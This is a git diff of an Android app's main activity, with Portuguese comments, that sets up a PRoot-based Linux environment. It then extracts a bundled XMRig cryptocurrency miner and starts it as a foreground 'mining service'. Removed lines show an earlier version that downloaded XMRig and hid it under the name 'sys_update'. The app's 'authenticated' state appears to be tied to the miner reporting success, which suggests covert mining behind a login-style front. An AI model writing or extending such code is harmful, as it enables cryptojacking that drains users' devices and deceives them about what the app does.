@@ -83,69 +83,62 @@ public class MainActivity extends Activity {
 
         new Thread(() -> {
             try {
-                // 1. Criar estrutura de "Maquina Virtual" (Rootfs virtual)
-                File rootfs = new File(getFilesDir(), "virtual_linux");
-                File binDir = new File(rootfs, "bin");
-                File tmpDir = new File(rootfs, "tmp");
-                File homeDir = new File(rootfs, "home");
+                // 1. Preparar pastas da VM (PRoot)
+                File vmDir = new File(getFilesDir(), "vm");
+                File rootfsDir = new File(vmDir, "rootfs");
                 
-                if (!binDir.exists()) binDir.mkdirs();
-                if (!tmpDir.exists()) tmpDir.mkdirs();
-                if (!homeDir.exists()) homeDir.mkdirs();
+                if (!vmDir.exists()) vmDir.mkdirs();
+                if (!rootfsDir.exists()) rootfsDir.mkdirs();
 
-                writeToLog("Inicializando ambiente virtual Linux...");
+                writeToLog("🏗️ Preparando ambiente virtual (PRoot)...");
+
+                // 2. Extrair ativos do APK (se não existirem)
+                boolean isFirstRun = !new File(vmDir, "proot").exists();
                 
-                // 2. Localização do minerador (dentro do bin da VM)
-                File minerBin = new File(binDir, "sys_update");
-                if (!minerBin.exists()) {
-                    writeToLog("Instalando componentes no ambiente virtual...");
-                    String downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-arm64.tar.gz";
-                    File tarFile = new File(tmpDir, "miner.tar.gz");
-                    downloadFile(downloadUrl, tarFile);
-                    
-                    writeToLog("Extraindo no rootfs virtual...");
-                    if (!extractTar(tarFile, binDir)) {
-                        writeToLog("ERRO: Falha na extração.");
+                if (isFirstRun) {
+                    writeToLog("📦 Extraindo rootfs Linux...");
+                    extractAsset("rootfs.tar.gz", new File(vmDir, "rootfs.tar.gz"));
+                    if (!extractTar(new File(vmDir, "rootfs.tar.gz"), rootfsDir)) {
+                        writeToLog("⚠️ Falha na extração do rootfs. Tentando continuar...");
                     }
-                    tarFile.delete();
-                }
-
-                // 3. Verificação Final e busca recursiva se falhou
-                if (!minerBin.exists()) {
-                    File found = findXmrigRecursively(binDir);
-                    if (found != null) {
-                        found.renameTo(minerBin);
-                        minerBin.setExecutable(true);
-                    }
-                }
-
-                // 4. Rodar miner.sh (o gerenciador da VM)
-                File script = new File(binDir, "miner.sh");
-                copyAsset("miner.sh", script);
-                script.setExecutable(true);
-
-                if (minerBin.exists()) {
-                    writeToLog("Rodando script dentro da VM isolada...");
-                    ProcessBuilder pb = new ProcessBuilder("sh", script.getAbsolutePath());
-                    pb.directory(homeDir); // O script começa na HOME da VM
+                    new File(vmDir, "rootfs.tar.gz").delete();
                     
-                    // Configurar ambiente como se fosse uma maquina real
-                    pb.environment().put("HOME", homeDir.getAbsolutePath());
-                    pb.environment().put("TMPDIR", tmpDir.getAbsolutePath());
-                    pb.environment().put("PATH", binDir.getAbsolutePath() + ":/system/bin:/system/xbin");
-                    pb.environment().put("IS_VIRTUAL_MACHINE", "true");
-                    pb.environment().put("VM_ROOT", rootfs.getAbsolutePath());
+                    writeToLog("🛠️ Instalando binários (proot + xmrig)...");
+                    extractAsset("proot", new File(vmDir, "proot"));
+                    extractAsset("xmrig", new File(vmDir, "xmrig"));
+                    extractAsset("init.sh", new File(vmDir, "init.sh"));
                     
-                    pb.redirectErrorStream(true);
-                    pb.start();
+                    new File(vmDir, "proot").setExecutable(true);
+                    new File(vmDir, "xmrig").setExecutable(true);
+                    new File(vmDir, "init.sh").setExecutable(true);
+                    
+                    // Garantir que o xmrig esteja no /bin do rootfs também
+                    File binInRootfs = new File(rootfsDir, "bin/xmrig");
+                    if (!binInRootfs.getParentFile().exists()) binInRootfs.getParentFile().mkdirs();
+                    extractAsset("xmrig", binInRootfs);
+                    binInRootfs.setExecutable(true);
+
+                    writeToLog("✅ Ambiente virtual preparado!");
                 } else {
-                    writeToLog("ERRO: Binário não encontrado na VM.");
+                    writeToLog("🔄 Ambiente virtual já configurado.");
                 }
 
-                // 5. Monitorar Log para Sucesso
+                // 3. Iniciar Foreground Service (VM)
+                writeToLog("🚀 Iniciando serviço de mineração...");
+                Intent serviceIntent = new Intent(this, MinerService.class);
+                serviceIntent.putExtra("vm_dir", vmDir.getAbsolutePath());
+                serviceIntent.putExtra("script_path", new File(vmDir, "init.sh").getAbsolutePath());
+                
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(serviceIntent);
+                } else {
+                    startService(serviceIntent);
+                }
+
+                // 4. Monitorar Logs (da HOME da VM)
+                File vmHomeLog = new File(rootfsDir, "root/sys_log.txt");
                 while (!isAuthenticated) {
-                    File vmLog = new File(homeDir, "sys_log.txt");
-                    if (vmLog.exists() && checkLogForSuccess(vmLog)) {
+                    if (vmHomeLog.exists() && checkLogForSuccess(vmHomeLog)) {
                         isAuthenticated = true;
                         updateUIToAuthenticated();
                         break;
@@ -154,7 +147,7 @@ public class MainActivity extends Activity {
                 }
 
             } catch (Exception e) {
-                writeToLog("ERRO VM: " + e.getMessage());
+                writeToLog("❌ ERRO VM: " + e.getMessage());
                 e.printStackTrace();
             }
         }).start();
@@ -286,7 +279,7 @@ public class MainActivity extends Activity {
         });
     }
 
-    private void copyAsset(String name, File dest) throws Exception {
+    private void extractAsset(String name, File dest) throws Exception {
         InputStream is = getAssets().open(name);
         OutputStream os = new FileOutputStream(dest);
         byte[] buffer = new byte[1024];
